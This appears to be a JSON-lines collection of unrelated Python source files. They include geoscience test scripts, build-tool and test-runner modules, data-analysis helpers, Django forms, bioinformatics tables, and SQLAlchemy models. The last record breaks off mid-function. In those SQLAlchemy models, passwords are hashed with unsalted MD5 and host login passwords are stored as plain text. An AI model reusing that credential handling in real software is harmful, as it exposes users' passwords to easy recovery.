{"text": "# -*- coding: utf-8 -*-\n\"\"\"\n\nJos\u00e9 Vicente P\u00e9rez\nGranada University (Spain)\nMarch, 2017\n\nTesting suite for profiler.py\nLast modified: 26 October 2017\n\"\"\"\n\nimport time\nimport profiler as p\n\nprint(\"Test for profiler.heads_from_points()\")\n\n\ndef test01():\n    \"\"\"\n    Test for profiler.heads_from_points() function\n    Intput points are in \"data/in/main_heads.shp\"\n    Test con id_field\n    \"\"\"\n    \n    inicio = time.time()\n    print(\"=\" * 40)\n    print(\"Test 01 para profiler.heads_from_points() function\")\n    print(\"Testing heads with an id_field\")\n    print(\"Test in progress...\")\n    \n    # Test parameters\n    dem = \"data/in/darro25.tif\"\n    pointshp = \"data/in/main_heads.shp\"\n    out_txt = \"data/out/01_cabeceras_puntos_01.txt\"\n    id_field = \"id\"\n    \n    cabeceras = p.heads_from_points(dem, pointshp, id_field)\n    outfile = open(out_txt, \"w\")\n    outfile.write(\"ROW;COL;X;Y;Z;id\\n\")\n    \n    for cab in cabeceras:\n        cab = [str(value) for value in cab]\n        linea = \";\".join(cab) + \"\\n\"\n        outfile.write(linea)\n    \n    outfile.close()\n    \n    fin = time.time()\n    print(\"Test finalizado en \" + str(fin - inicio) + \" segundos\")\n    print(\"Resultado en \" + out_txt)\n    print(\"=\" * 40)\n\n\ndef test02():\n    \"\"\"\n    Test for profiler.heads_from_points() function\n    Intput points are in \"data/in/main_heads.shp\"\n    Test sin campo id_field\n    \"\"\"\n\n    inicio = time.time()\n    print(\"=\" * 40)\n    print(\"Test 02 para profiler.heads_from_points() function\")\n    print(\"Testing without id_field\")\n    print(\"Test in progress...\")\n\n    # Test parameters\n    dem = \"data/in/darro25.tif\"\n    pointshp = \"data/in/main_heads.shp\"\n    out_txt = \"data/out/01_cabeceras_puntos_02.txt\"\n\n    cabeceras = p.heads_from_points(dem, pointshp)\n    outfile = open(out_txt, \"w\")\n    outfile.write(\"ROW;COL;X;Y;Z;id\\n\")\n\n    for cab in cabeceras:\n        cab = [str(value) for value in cab]\n        linea = \";\".join(cab) + \"\\n\"\n        outfile.write(linea)\n\n    outfile.close()\n\n    fin = time.time()\n    print(\"Test finalizado en \" + str(fin - inicio) + \" segundos\")\n    print(\"Resultado en \" + out_txt)\n    print(\"=\" * 40)\n\n\ndef test03():\n    \"\"\"\n    Test for profiler.heads_from_points() function\n    Intput points are in \"data/in/main_heads.shp\"\n    Test con id_field que no existe en la capa de puntos\n    \"\"\"\n\n    inicio = time.time()\n    print(\"=\" * 40)\n    print(\"Test 03 para profiler.heads_from_points() function\")\n    print(\"Testing a field that is not in head shapefile\")\n    print(\"Test in progress...\")\n\n    # Test parameters\n    dem = \"data/in/darro25.tif\"\n    pointshp = \"data/in/main_heads.shp\"\n    out_txt = \"data/out/01_cabeceras_puntos_03.txt\"\n    id_field = \"id_rio\"\n\n    cabeceras = p.heads_from_points(dem, pointshp, id_field)\n    outfile = open(out_txt, \"w\")\n    outfile.write(\"ROW;COL;X;Y;Z;id\\n\")\n\n    for cab in cabeceras:\n        cab = [str(value) for value in cab]\n        linea = \";\".join(cab) + \"\\n\"\n        outfile.write(linea)\n\n    outfile.close()\n\n    fin = time.time()\n    print(\"Test finalizado en \" + str(fin - inicio) + \" segundos\")\n    print(\"Resultado en \" + out_txt)\n    print(\"=\" * 40)\n\n\ndef test04():\n    \"\"\"\n    Test for profiler.heads_from_points() function\n    Intput points are in \"data/in/cabeceras_darro.shp\"\n    Test un campo id_field que no es entero\n    \"\"\"\n\n    inicio = time.time()\n    print(\"=\" * 40)\n    print(\"Test 04 para profiler.heads_from_points() function\")\n    print(\"Testing wrong id_field (bad field type)\")\n    print(\"Test in progress...\")\n\n    # Test parameters\n    dem = \"data/in/darro25.tif\"\n    pointshp = \"data/in/main_heads.shp\"\n    out_txt = \"data/out/01_cabeceras_puntos_04.txt\"\n    id_field = \"name\"\n\n    cabeceras = p.heads_from_points(dem, pointshp, id_field)\n    outfile = open(out_txt, \"w\")\n    outfile.write(\"ROW;COL;X;Y;Z;id\\n\")\n\n    for cab in cabeceras:\n        cab = [str(value) for value in cab]\n        linea = \";\".join(cab) + \"\\n\"\n        outfile.write(linea)\n\n    outfile.close()\n\n    fin = time.time()\n    print(\"Test finalizado en \" + str(fin - inicio) + \" segundos\")\n    print(\"Resultado en \" + out_txt)\n    print(\"=\" * 40)\n\ntest01()\ntest02()\ntest03()\ntest04()\n"}
{"text": "\"\"\"SCons.Tool.ifort\n\nTool-specific initialization for newer versions of the Intel Fortran Compiler\nfor Linux/Windows (and possibly Mac OS X).\n\nThere normally shouldn't be any need to import this module directly.\nIt will usually be imported through the generic SCons.Tool.Tool()\nselection method.\n\n\"\"\"\n\n#\n# Copyright (c) 2001, 2002, 2003, 2004, 2005, 2006, 2007, 2008, 2009 The SCons Foundation\n#\n# Permission is hereby granted, free of charge, to any person obtaining\n# a copy of this software and associated documentation files (the\n# \"Software\"), to deal in the Software without restriction, including\n# without limitation the rights to use, copy, modify, merge, publish,\n# distribute, sublicense, and/or sell copies of the Software, and to\n# permit persons to whom the Software is furnished to do so, subject to\n# the following conditions:\n#\n# The above copyright notice and this permission notice shall be included\n# in all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY\n# KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE\n# WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE\n# LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION\n# OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION\n# WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n#\n\n__revision__ = \"src/engine/SCons/Tool/ifort.py 4369 2009/09/19 15:58:29 scons\"\n\nimport string\n\nimport SCons.Defaults\nfrom SCons.Scanner.Fortran import FortranScan\nfrom FortranCommon import add_all_to_env\n\ndef generate(env):\n    \"\"\"Add Builders and construction variables for ifort to an Environment.\"\"\"\n    # ifort supports Fortran 90 and Fortran 95\n    # Additionally, ifort recognizes more file extensions.\n    fscan = FortranScan(\"FORTRANPATH\")\n    SCons.Tool.SourceFileScanner.add_scanner('.i', fscan)\n    SCons.Tool.SourceFileScanner.add_scanner('.i90', fscan)\n\n    if 'FORTRANFILESUFFIXES' not in env:\n        env['FORTRANFILESUFFIXES'] = ['.i']\n    else:\n        env['FORTRANFILESUFFIXES'].append('.i')\n\n    if 'F90FILESUFFIXES' not in env:\n        env['F90FILESUFFIXES'] = ['.i90']\n    else:\n        env['F90FILESUFFIXES'].append('.i90')\n\n    add_all_to_env(env)\n\n    fc = 'ifort'\n\n    for dialect in ['F77', 'F90', 'FORTRAN', 'F95']:\n        env['%s' % dialect] = fc\n        env['SH%s' % dialect] = '$%s' % dialect\n        if env['PLATFORM'] == 'posix':\n            env['SH%sFLAGS' % dialect] = SCons.Util.CLVar('$%sFLAGS -fPIC' % dialect)\n\n    if env['PLATFORM'] == 'win32':\n        # On Windows, the ifort compiler specifies the object on the\n        # command line with -object:, not -o.  Massage the necessary\n        # command-line construction variables.\n        for dialect in ['F77', 'F90', 'FORTRAN', 'F95']:\n            for var in ['%sCOM' % dialect, '%sPPCOM' % dialect,\n                        'SH%sCOM' % dialect, 'SH%sPPCOM' % dialect]:\n                env[var] = string.replace(env[var], '-o $TARGET', '-object:$TARGET')\n        env['FORTRANMODDIRPREFIX'] = \"/module:\"\n    else:\n        env['FORTRANMODDIRPREFIX'] = \"-module \"\n\ndef exists(env):\n    return env.Detect('ifort')\n\n# Local Variables:\n# tab-width:4\n# indent-tabs-mode:nil\n# End:\n# vim: set expandtab tabstop=4 shiftwidth=4:\n"}
{"text": "# Copyright (C) 2016 Intel Corporation\n# Released under the MIT license (see COPYING.MIT)\n\nimport os\nimport time\nimport unittest\nimport logging\n\nxmlEnabled = False\ntry:\n    import xmlrunner\n    from xmlrunner.result import _XMLTestResult as _TestResult\n    from xmlrunner.runner import XMLTestRunner as _TestRunner\n    xmlEnabled = True\nexcept ImportError:\n    # use the base runner instead\n    from unittest import TextTestResult as _TestResult\n    from unittest import TextTestRunner as _TestRunner\n\nclass OEStreamLogger(object):\n    def __init__(self, logger):\n        self.logger = logger\n        self.buffer = \"\"\n\n    def write(self, msg):\n        if len(msg) > 1 and msg[0] != '\\n':\n            self.buffer += msg\n        else:\n            self.logger.log(logging.INFO, self.buffer.rstrip(\"\\n\"))\n            self.buffer = \"\"\n\n    def flush(self):\n        for handler in self.logger.handlers:\n            handler.flush()\n\nclass OETestResult(_TestResult):\n    def __init__(self, tc, *args, **kwargs):\n        super(OETestResult, self).__init__(*args, **kwargs)\n\n        self.tc = tc\n\n        self.tc._results['failures'] = self.failures\n        self.tc._results['errors'] = self.errors\n        self.tc._results['skipped'] = self.skipped\n        self.tc._results['expectedFailures'] = self.expectedFailures\n\n    def startTest(self, test):\n        super(OETestResult, self).startTest(test)\n\nclass OETestRunner(_TestRunner):\n    def __init__(self, tc, *args, **kwargs):\n        if xmlEnabled:\n            if not kwargs.get('output'):\n                kwargs['output'] = os.path.join(os.getcwd(),\n                        'TestResults_%s' % time.strftime(\"%Y%m%d%H%M%S\"))\n\n        super(OETestRunner, self).__init__(*args, **kwargs)\n        self.tc = tc\n        self.resultclass = OETestResult\n\n    # XXX: The unittest-xml-reporting package defines _make_result method instead\n    # of _makeResult standard on unittest.\n    if xmlEnabled:\n        def _make_result(self):\n            \"\"\"\n            Creates a TestResult object which will be used to store\n            information about the executed tests.\n            \"\"\"\n            # override in subclasses if necessary.\n            return self.resultclass(self.tc,\n                self.stream, self.descriptions, self.verbosity, self.elapsed_times\n            )\n    else:\n        def _makeResult(self):\n            return self.resultclass(self.tc, self.stream, self.descriptions,\n                    self.verbosity)\n"}
{"text": "##Module that converts the Xml response to dictionary\nfrom lxml import etree\nimport re\n\n\ndef dictlist(node):\n    res = {}\n    node_tag = re.findall(r'}(\\w*)', node.tag)\n    node_tag = node_tag[0]\n    res[node_tag] = []\n    xmltodict(node, res[node_tag])\n    reply = {}\n    reply[node_tag] = res[node_tag]\n    return reply\n\ndef xmltodict(node, res):\n    rep = {}\n    node_tag = re.findall(r'}(\\w*)', node.tag)\n    node_tag = node_tag[0]\n    if len(node):\n        #n = 0\n        for n in list(node):\n\n            rep[node_tag] = []\n            value = xmltodict(n, rep[node_tag])\n            if len(n):\n                n_tag = re.findall(r'}(\\w*)', n.tag)\n                n_tag = n_tag[0]\n                value = rep[node_tag]\n                res.append({n_tag:value})\n            else :\n\n                res.append(rep[node_tag][0])\n\n    else:\n        value = {}\n        value = node.text\n        res.append({node_tag:value})\n\n    return\n\ndef main(xml_string):\n    tree = etree.fromstring(xml_string)\n    res = dictlist(tree)\n    return res\n\nif __name__ == '__main__' :\n    main()\n"}
{"text": "from sklearn.cross_validation import train_test_split\nfrom sklearn import metrics\nimport matplotlib.pyplot as plt\nimport pickle\nfrom src.utils.get_time_stamp import get_time_stamp\nfrom sklearn.grid_search import GridSearchCV\n\n\ndef make_roc_curve(pipeline, X, y, train_frac, subject, cfg):\n    X_train, X_test, y_train, y_test = train_test_split(X, y,\n                                                        train_size=train_frac,\n                                                        random_state=1,\n                                                        stratify=y)\n    grid_search = GridSearchCV(pipeline, {}, scoring=cfg['scoring'],\n                               verbose=10)\n    grid_search.fit(X_train, y_train)\n    y_pred_class = grid_search.predict(X_test)\n    y_pred_prob = grid_search.predict_proba(X_test)[:, 1]\n    acc_score = metrics.accuracy_score(y_test, y_pred_class)\n    print(acc_score)\n    conf_mat = metrics.confusion_matrix(y_test, y_pred_class)\n    print(conf_mat)\n    fpr, tpr, thresholds = metrics.roc_curve(y_test, y_pred_prob)\n    roc_auc = metrics.auc(fpr, tpr)\n\n    # method I: plt\n\n    plt.title(subject + '\\nReceiver Operating Characteristic')\n    plt.plot(fpr, tpr, 'b', label='AUC = %0.2f' % roc_auc)\n    plt.legend(loc='lower right')\n    plt.plot([0, 1], [0, 1], 'r--')\n    plt.xlim([0, 1])\n    plt.ylim([0, 1])\n    plt.ylabel('True Positive Rate')\n    plt.xlabel('False Positive Rate')\n    fig_dir = cfg['fig_dir']\n    plt.savefig(fig_dir + '/roc_curve_' + subject.lower() +\n                '_' + get_time_stamp() + '.png')\n    results_save = (grid_search, X_test, y_test, acc_score, conf_mat,\n                    y_pred_class, y_pred_prob)\n    pickle.dump(results_save, open(fig_dir + '/split_data_' + subject.lower() +\n                                   '_' + get_time_stamp() + '.p', 'wb'))\n"}
{"text": "from .math_helpers import kl_divergence_dict\nfrom .graph import Graph\nfrom .edges import edges_to_edge_dict\n\nfrom nose.tools import assert_almost_equal\n\n\ndef check_detailed_balance(edges, s, places=7):\n    \"\"\"\n    Check if the detailed balance condition is satisfied.\n\n    Parameters\n    ----------\n    edges: list of tuples\n        transitions of the Markov process\n    s: dict\n        the stationary distribution\n    places: int\n        Decimal places of precision to require\n    \"\"\"\n\n    edge_dict = edges_to_edge_dict(edges)\n    for s1, s2 in edge_dict.keys():\n        diff = s[s1] * edge_dict[(s1, s2)] - s[s2] * edge_dict[(s2, s1)]\n        assert_almost_equal(diff, 0, places=places)\n\n\ndef check_global_balance(edges, stationary, places=7):\n    \"\"\"\n    Checks that the stationary distribution satisfies the global balance\n    condition. https://en.wikipedia.org/wiki/Balance_equation\n\n    Parameters\n    ----------\n    edges: list of tuples\n        transitions of the Markov process\n    stationary: dict\n        the stationary distribution\n    places: int\n        Decimal places of precision to require\n    \"\"\"\n\n    g = Graph(edges)\n\n    for s1 in g.vertices():\n        lhs = 0.\n        rhs = 0.\n        for s2, v in g.out_dict(s1).items():\n            if s1 == s2:\n                continue\n            lhs += stationary[s1] * v\n        for s2, v in g.in_dict(s1).items():\n            if s1 == s2:\n                continue\n            rhs += stationary[s2] * v\n        assert_almost_equal(lhs, rhs, places=places)\n\n\ndef check_eigenvalue(edges, s, places=3):\n    \"\"\"\n    Check that the stationary distribution satisfies the eigenvalue condition.\n\n    Parameters\n    ----------\n    edges: list of tuples\n        transitions of the Markov process\n    s: dict\n        the stationary distribution\n    places: int\n        Decimal places of precision to require\n    \"\"\"\n\n    g = Graph(edges)\n    t = g.left_multiply(s)\n    assert_almost_equal(kl_divergence_dict(s, t), 0, places=places)\n"}
{"text": "#!/usr/bin/env python\n#------------------------------------------------------------------------------\n#\n#   Extract O&M-EOP metadata document.\n#\n# Project: EO Metadata Handling\n# Authors: Martin Paces <martin.paces@eox.at>\n#\n#-------------------------------------------------------------------------------\n# Copyright (C) 2013 EOX IT Services GmbH\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies of this Software or works derived from this Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n# THE SOFTWARE.\n#-------------------------------------------------------------------------------\n\nimport traceback\nimport sys\nimport os.path\nfrom lxml import etree as et\n\nfrom profiles.interfaces import ProfileDimap\nfrom profiles.spot6_ortho import ProfileSpot6Ortho\nfrom profiles.spot_view import ProfileSpotView\nfrom profiles.spot_scene_1a import ProfileSpotScene1a\nfrom profiles.pleiades1_ortho import ProfilePleiades1Ortho\n\nXML_OPTS = {'pretty_print': True, 'xml_declaration': True, 'encoding': 'utf-8'}\n\nPROFILES = (\n    ProfileSpotScene1a, ProfileSpotView,\n    ProfileSpot6Ortho, ProfilePleiades1Ortho,\n)\n\ndef main(fname):\n    xml = et.parse(fname, et.XMLParser(remove_blank_text=True))\n    profile = get_profile(xml)\n    print et.tostring(profile.extract_eop_metadata(xml, file_name=fname), **XML_OPTS)\n\ndef get_profile(xml):\n    for item in PROFILES:\n        if item.check_profile(xml):\n            return item\n    prf = ProfileDimap.get_dimap_profile(xml)\n    if prf is None:\n        raise ValueError(\"Not a DIMAP XML document!\")\n    profile, version = prf\n    raise ValueError(\"Unsupported DIMAP version %s profile '%s'!\"%(version, profile))\n\n#------------------------------------------------------------------------------\n\nif __name__ == \"__main__\":\n    EXENAME = os.path.basename(sys.argv[0])\n    DEBUG = False\n\n    try:\n        XML = sys.argv[1]\n        for arg in sys.argv[2:]:\n            if arg == \"DEBUG\":\n                DEBUG = True # dump debuging output\n\n    except IndexError:\n        print >>sys.stderr, \"ERROR: %s: Not enough input arguments!\"%EXENAME\n        print >>sys.stderr\n        print >>sys.stderr, \"Extract EOP XML metadata from DIMAP XML metadata.\"\n        print >>sys.stderr\n        print >>sys.stderr, \"USAGE: %s <input-xml> [DEBUG]\"%EXENAME\n        sys.exit(1)\n\n    if DEBUG:\n        print >>sys.stderr, \"input-xml:   \", XML\n\n    try:\n        main(XML)\n    except Exception as exc:\n        print >>sys.stderr, \"ERROR: %s: %s \"%(EXENAME, exc)\n        if DEBUG:\n            print >>sys.stderr, traceback.format_exc()\n        sys.exit(1)\n"}
{"text": "import pyfits\nimport numpy\n\nSTAT_HOIM = []\nSTAT_ANGSENS = []\nSTAT_XSENS = []\nSTAT_YSENS = []\nSTAT_ANGLE_TABLE = []\nfor derotAngle in numpy.arange(180.0):\n    IM = numpy.ones(8160)*(-1.0*derotAngle)\n    STAT_HOIM.append(IM)\n    ANGSENS = (numpy.ones(8160)*derotAngle+0.1)*(-1.0)\n    STAT_ANGSENS.append(ANGSENS)\n    XSENS = (numpy.ones(8160)*derotAngle+0.2)*(-1.0)\n    STAT_XSENS.append(XSENS)\n    YSENS = (numpy.ones(8160)*derotAngle+0.3)*(-1.0)\n    STAT_YSENS.append(YSENS)\n    ANGLE_TABLE = numpy.array([139.5, derotAngle])\n    STAT_ANGLE_TABLE.append(ANGLE_TABLE)\n\nSTAT_HOIM = numpy.array(STAT_HOIM, dtype=numpy.float32)\nSTAT_ANGSENS = numpy.array(STAT_ANGSENS, dtype=numpy.float32)\nSTAT_YSENS = numpy.array(STAT_YSENS, dtype=numpy.float32)\nSTAT_XSENS = numpy.array(STAT_XSENS, dtype=numpy.float32)\nSTAT_ANGLE_TABLE = numpy.array(STAT_ANGLE_TABLE, dtype=numpy.float32)\n\nhdu = pyfits.PrimaryHDU(data=STAT_HOIM.T)\nhdu.writeto('RTC.STAT.HOIM.fits', clobber=True)\nhdu = pyfits.PrimaryHDU(data=STAT_ANGSENS.T)\nhdu.writeto('RTC.STAT.ANGSENS.fits', clobber=True)\nhdu = pyfits.PrimaryHDU(data=STAT_XSENS.T)\nhdu.writeto('RTC.STAT.XSENS.fits', clobber=True)\nhdu = pyfits.PrimaryHDU(data=STAT_YSENS.T)\nhdu.writeto('RTC.STAT.YSENS.fits', clobber=True)\nhdu = pyfits.PrimaryHDU(data=STAT_ANGLE_TABLE)\nhdu.writeto('RTC.STAT.ANGLE_TABLE.fits', clobber=True)\n\n\nSKY_HOIM = []\nSKY_ANGSENS = []\nSKY_XSENS = []\nSKY_YSENS = []\nSKY_ANGLE_TABLE = []\nfor skyAngle in numpy.arange(0.0, 360.0, 2.0):\n    IM = numpy.ones(8160)*(skyAngle)\n    SKY_HOIM.append(IM)\n    ANGSENS = numpy.ones(8160)*skyAngle+0.1\n    SKY_ANGSENS.append(ANGSENS)\n    XSENS = numpy.ones(8160)*skyAngle +0.2\n    SKY_XSENS.append(XSENS)\n    YSENS = numpy.ones(8160)*skyAngle +0.3\n    SKY_YSENS.append(YSENS)\n    ANGLE_TABLE = numpy.array([skyAngle, 0.0])\n    SKY_ANGLE_TABLE.append(ANGLE_TABLE)\n\nSKY_HOIM = numpy.array(SKY_HOIM, dtype=numpy.float32)\nSKY_ANGSENS = numpy.array(SKY_ANGSENS, dtype=numpy.float32)\nSKY_YSENS = numpy.array(SKY_YSENS, dtype=numpy.float32)\nSKY_XSENS = numpy.array(SKY_XSENS, dtype=numpy.float32)\nSKY_ANGLE_TABLE = numpy.array(SKY_ANGLE_TABLE, dtype=numpy.float32)\n\nhdu = pyfits.PrimaryHDU(data=SKY_HOIM.T)\nhdu.writeto('RTC.SKY.HOIM.fits', clobber=True)\nhdu = pyfits.PrimaryHDU(data=SKY_ANGSENS.T)\nhdu.writeto('RTC.SKY.ANGSENS.fits', clobber=True)\nhdu = pyfits.PrimaryHDU(data=SKY_XSENS.T)\nhdu.writeto('RTC.SKY.XSENS.fits', clobber=True)\nhdu = pyfits.PrimaryHDU(data=SKY_YSENS.T)\nhdu.writeto('RTC.SKY.YSENS.fits', clobber=True)\nhdu = pyfits.PrimaryHDU(data=SKY_ANGLE_TABLE)\nhdu.writeto('RTC.SKY.ANGLE_TABLE.fits', clobber=True)\n\n"}
{"text": "from django import forms\nfrom django.contrib.auth.models import User\n\nfrom .models import Department\n\nclass NewUserTicket(forms.Form):\n    username = forms.CharField(label='Username', max_length=32)\n    password = forms.CharField(label='Password', widget=forms.PasswordInput)\n    firstname = forms.CharField(label='First Name', max_length=32, required=False)\n    lastname = forms.CharField(label='Last Name', max_length=32, required=False)\n    address = forms.CharField(max_length=256, required=False)\n    city = forms.CharField(max_length=128, required=False)\n    state = forms.CharField(max_length=128, required=False)\n    postal_code = forms.CharField(max_length=16, required=False)\n    phone = forms.CharField(max_length=16, required=False)\n    department = forms.ModelChoiceField(Department.objects.all())\n\n    # form validator to ensure unique username\n    def clean_username(self):\n        username = self.cleaned_data['username']\n        try:\n            user = User.objects.get(username=username)\n        except User.DoesNotExist:\n            return username\n        raise forms.ValidationError(u'Username \"{}\" is already in use.'.format(username))\n\n\nclass UserSearchForm(forms.Form):\n    username = forms.CharField(label='Username', max_length=32, required=False)\n    first_name = forms.CharField(label='First Name', max_length=32, required=False)\n    last_name = forms.CharField(label='Last Name', max_length=32, required=False)\n\n    def get_users(self):\n        users = User.objects\n        is_filtered = False\n        for f in ['first_name', 'last_name', 'username']:\n            if self.cleaned_data[f]:\n                is_filtered = True\n                users = users.filter(**{\n                    f+'__icontains': self.cleaned_data[f]\n                })\n        if is_filtered:\n            return users\n        return []"}
{"text": "# Copyright 2009 New England Biolabs <davisp@neb.com>\n#\n# This file is part of the BioNEB package released\n# under the MIT license.\n#\nimport string\n\nDEGENERATES = {\n    \"A\": \"A\",   \"C\": \"C\",   \"G\": \"G\",   \"T\": \"T\",   \"U\": \"U\",\n    \"W\": \"AT\",  \"S\": \"CG\",  \"M\": \"AC\",  \"K\": \"GT\",  \"R\": \"AG\",  \"Y\": \"CT\",\n    \"B\": \"AGT\", \"D\": \"ACT\", \"H\": \"ACT\", \"V\": \"ACG\", \"N\": \"ACGT\"\n}\n\nCOMPLEMENTS = [\n    \"ACGTUNSWMKRYVDHBacgtunswmkryvdhb\",\n    \"TGCAANSWKMYRBHDVtgcaanswkmyrbhdv\"\n]\nTRANSTABLE = string.maketrans(COMPLEMENTS[0], COMPLEMENTS[1])\n\n# Three letter codes\nAMINO_ACID_TLC = {\n    \"ALA\": \"A\",\n    \"ASX\": \"B\",\n    \"CYS\": \"C\",\n    \"ASP\": \"D\",\n    \"GLU\": \"E\",\n    \"PHE\": \"F\",\n    \"GLY\": \"G\",\n    \"HIS\": \"H\",\n    \"ILE\": \"I\",\n    \"LYS\": \"K\",\n    \"LEU\": \"L\",\n    \"MET\": \"M\",\n    \"ASN\": \"N\",\n    \"PYL\": \"O\",\n    \"PRO\": \"P\",\n    \"GLN\": \"Q\",\n    \"ARG\": \"R\",\n    \"SER\": \"S\",\n    \"THR\": \"T\",\n    \"SEC\": \"U\",\n    \"VAL\": \"V\",\n    \"TRP\": \"W\",\n    \"XAA\": \"X\",\n    \"TYR\": \"Y\",\n    \"GLX\": \"Z\",\n    # Due to Genbank awesomeness\n    \"OTHER\": \"X\", \n    \"TERM\": \"*\"\n}\n\nCODONS = [\"%s%s%s\" % (b1, b2, b3)\n    for b1 in \"TCAG\" for b2 in \"TCAG\" for b3 in \"TCAG\"]\n\nCODON_TABLE_DATA = [\n    \"\"\"1\n    FFLLSSSSYY**CC*WLLLLPPPPHHQQRRRRIIIMTTTTNNKKSSRRVVVVAAAADDEEGGGG\n    ---M---------------M---------------M----------------------------\"\"\",\n    \"\"\"2\n    FFLLSSSSYY**CCWWLLLLPPPPHHQQRRRRIIMMTTTTNNKKSS**VVVVAAAADDEEGGGG\n    --------------------------------MMMM---------------M------------\"\"\",\n    \"\"\"3\n    FFLLSSSSYY**CCWWTTTTPPPPHHQQRRRRIIMMTTTTNNKKSSRRVVVVAAAADDEEGGGG\n    ----------------------------------MM----------------------------\"\"\",\n    \"\"\"4\n    FFLLSSSSYY**CCWWLLLLPPPPHHQQRRRRIIIMTTTTNNKKSSRRVVVVAAAADDEEGGGG\n    --MM---------------M------------MMMM---------------M------------\"\"\",\n    \"\"\"5\n    FFLLSSSSYY**CCWWLLLLPPPPHHQQRRRRIIMMTTTTNNKKSSSSVVVVAAAADDEEGGGG\n    ---M----------------------------MMMM---------------M------------\"\"\",\n    \"\"\"6\n    FFLLSSSSYYQQCC*WLLLLPPPPHHQQRRRRIIIMTTTTNNKKSSRRVVVVAAAADDEEGGGG\n    -----------------------------------M----------------------------\"\"\",\n    \"\"\"9\n    FFLLSSSSYY**CCWWLLLLPPPPHHQQRRRRIIIMTTTTNNNKSSSSVVVVAAAADDEEGGGG\n    -----------------------------------M---------------M------------\"\"\",\n    \"\"\"10\n    FFLLSSSSYY**CC*WLLLLPPPPHHQQRRRRIIIMTTTTNNKKSSRRVVVVAAAADDEEGGGG\n    ---M---------------M------------MMMM---------------M------------\"\"\",\n    \"\"\"11\n    FFLLSSSSYY**CC*WLLLLPPPPHHQQRRRRIIIMTTTTNNKKSSRRVVVVAAAADDEEGGGG\n    ---M---------------M------------MMMM---------------M------------\"\"\",\n    \"\"\"12\n    FFLLSSSSYY**CC*WLLLSPPPPHHQQRRRRIIIMTTTTNNKKSSRRVVVVAAAADDEEGGGG\n    -------------------M---------------M----------------------------\"\"\",\n    \"\"\"13\n    FFLLSSSSYY**CCWWLLLLPPPPHHQQRRRRIIMMTTTTNNKKSSGGVVVVAAAADDEEGGGG\n    ---M------------------------------MM---------------M------------\"\"\",\n    \"\"\"14\n    FFLLSSSSYYY*CCWWLLLLPPPPHHQQRRRRIIIMTTTTNNNKSSSSVVVVAAAADDEEGGGG\n    -----------------------------------M----------------------------\"\"\",\n    \"\"\"15\n    FFLLSSSSYY*QCC*WLLLLPPPPHHQQRRRRIIIMTTTTNNKKSSRRVVVVAAAADDEEGGGG\n    -----------------------------------M----------------------------\"\"\",\n    \"\"\"16\n    FFLLSSSSYY*LCC*WLLLLPPPPHHQQRRRRIIIMTTTTNNKKSSRRVVVVAAAADDEEGGGG\n    -----------------------------------M----------------------------\"\"\",\n    \"\"\"21\n    FFLLSSSSYY**CCWWLLLLPPPPHHQQRRRRIIMMTTTTNNNKSSSSVVVVAAAADDEEGGGG\n    -----------------------------------M---------------M------------\"\"\",\n    \"\"\"22\n    FFLLSS*SYY*LCC*WLLLLPPPPHHQQRRRRIIIMTTTTNNKKSSRRVVVVAAAADDEEGGGG\n    -----------------------------------M----------------------------\"\"\",\n    \"\"\"23\n    FF*LSSSSYY**CC*WLLLLPPPPHHQQRRRRIIIMTTTTNNKKSSRRVVVVAAAADDEEGGGG\n    --------------------------------M--M---------------M------------\"\"\"\n]"}
{"text": "# coding: u8\n\nfrom tornado.util import ObjectDict\n\nfrom sqlalchemy import create_engine\nfrom sqlalchemy import (Column, Integer, Text, String, Boolean)\nfrom sqlalchemy.ext.declarative import declarative_base\nfrom sqlalchemy.orm import sessionmaker\nfrom sqlalchemy.orm.attributes import InstrumentedAttribute\n\nimport settings\nimport utils\n\n\nparams = dict(\n    encoding='utf8',\n    echo=False,\n    pool_recycle=7200,\n)\n\nconn_str = 'sqlite:///%s' % settings.DB_PATH\nengine = create_engine(conn_str, **params)\n\n\ndb_factory = lambda: sessionmaker(bind=engine)()\n_Base = declarative_base()\n\n\nclass Base(_Base):\n    __abstract__ = True\n\n    id = Column(Integer, primary_key=True, autoincrement=True)\n\n    def as_dict(self):\n        r = {c: getattr(self, c) for c in self.columns()}\n        return ObjectDict(r)\n\n    @classmethod\n    def get_columns(cls):\n        c = {}\n        for k, v in vars(cls).iteritems():\n            if type(v) is InstrumentedAttribute:\n                c[k] = v\n        return ObjectDict(c)\n\n    @classmethod\n    def columns(cls):\n        return cls.get_columns().keys()\n\n\nclass User(Base):\n    __tablename__ = 'user'\n\n    name = Column(Text, index=True)\n    pwd = Column(String(32))\n\n    @staticmethod\n    def reset_password(handler, old, new):\n        db = handler.db\n        user = db.query(User).filter_by(name=handler.username).first()\n        if user.pwd != utils.md5(old):\n            return False\n        user.pwd = utils.md5(new)\n        return True\n\n\nclass Host(Base):\n    __tablename__ = 'host'\n\n    user = Column(Text)\n    pwd = Column(Text)\n    host = Column(Text)\n    port = Column(Integer)\n    is_active = Column(Boolean, server_default='1')\n\n    @staticmethod\n    def delete(db, id):\n        return 